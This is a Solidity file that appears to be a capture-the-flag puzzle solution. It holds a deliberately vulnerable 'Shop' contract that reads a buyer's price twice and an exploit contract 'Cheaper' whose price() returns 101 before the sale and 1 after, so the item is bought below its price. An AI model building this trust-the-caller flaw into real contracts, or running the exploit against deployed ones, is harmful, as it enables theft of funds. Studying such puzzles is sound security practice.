// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
Ð¡an you get the item from the shop for less than the price asked?

Things that might help:
> Shop expects to be used from a Buyer
> Understanding restrictions of view functions
*/

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Cheaper is Buyer {
    address public owner;
    Shop public original;

    constructor(address payable _to) {
        owner = msg.sender;
        original = Shop(_to);
    }

    function price() external view returns (uint256) {
        if (original.isSold() == false) {
            return 101;
        } else {
            return 1;
        }
    }

    function boom() public {
        original.buy();
    }
}
